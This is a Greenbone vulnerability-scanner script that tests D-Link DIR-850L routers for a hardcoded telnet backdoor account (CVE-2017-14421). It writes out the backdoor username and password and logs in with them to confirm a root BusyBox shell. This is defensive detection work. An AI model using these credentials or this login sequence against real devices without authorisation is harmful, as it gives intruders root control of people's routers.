# SPDX-FileCopyrightText: 2018 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.107301");
  script_version("2023-11-10T16:09:31+0000");
  script_cve_id("CVE-2017-14421");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2023-11-10 16:09:31 +0000 (Fri, 10 Nov 2023)");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2023-11-08 20:59:00 +0000 (Wed, 08 Nov 2023)");
  script_tag(name:"creation_date", value:"2018-03-19 13:22:17 +0100 (Mon, 19 Mar 2018)");
  script_name("D-Link DIR-850L Backdoor Account / Hardcoded Credentials (Telnet)");
  script_category(ACT_ATTACK);
  script_family("Default Accounts");
  script_copyright("Copyright (C) 2018 Greenbone AG");
  script_dependencies("telnetserver_detect_type_nd_version.nasl", "gb_default_credentials_options.nasl");
  script_require_ports("Services/telnet", 23);
  script_mandatory_keys("telnet/banner/available");
  script_exclude_keys("default_credentials/disable_default_account_checks");

  script_xref(name:"URL", value:"https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html#backdoor");

  script_tag(name:"summary", value:"The D-Link DIR-850L router has a backdoor account with hardcoded credentials.");

  script_tag(name:"impact", value:"This issue may only be exploited by an attacker on the LAN to get a root
  shell on the device.");

  script_tag(name:"vuldetect", value:"Connect to the Telnet service and try to login with default credentials.");

  script_tag(name:"insight", value:"It was possible to login with the telnet credentials 'Alphanetworks:wrgac25_dlink.2013gui_dir850l'.");

  script_tag(name:"solution", value:"It is recommended to disable the Telnet access.");

  script_tag(name:"qod_type", value:"exploit");
  script_tag(name:"solution_type", value:"Mitigation");

  exit(0);
}

if(get_kb_item("default_credentials/disable_default_account_checks"))
  exit(0);

include("telnet_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = telnet_get_port( default:23 );
if( get_kb_item( "telnet/" + port + "/no_login_banner" ) )
  exit( 0 );

login = "Alphanetworks";
pass = "wrgac25_dlink.2013gui_dir850l";

soc = open_sock_tcp( port );
if( ! soc )
  exit( 0 );

recv = telnet_negotiate( socket:soc );

if( "Login:" >< recv ) {

  send( socket:soc, data:login + '\r\n' );
  recv = recv( socket:soc, length:128 );

  if( "Password:" >< recv ) {

    send( socket:soc, data:pass + '\r\n\r\n' );
    recv = recv( socket:soc, length:1024 );

    send( socket:soc, data:'sh\r\n');
    recv = recv( socket:soc, length:1024 );

    if( "BusyBox" >< recv && "built-in shell" >< recv ) {
      VULN = TRUE;
      report = 'It was possible to login via telnet using the following credentials:\n\n';
      report += 'Login: ' + login + ', Password: ' + pass;
    }
  }
}

close( soc );

if( VULN ) {
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
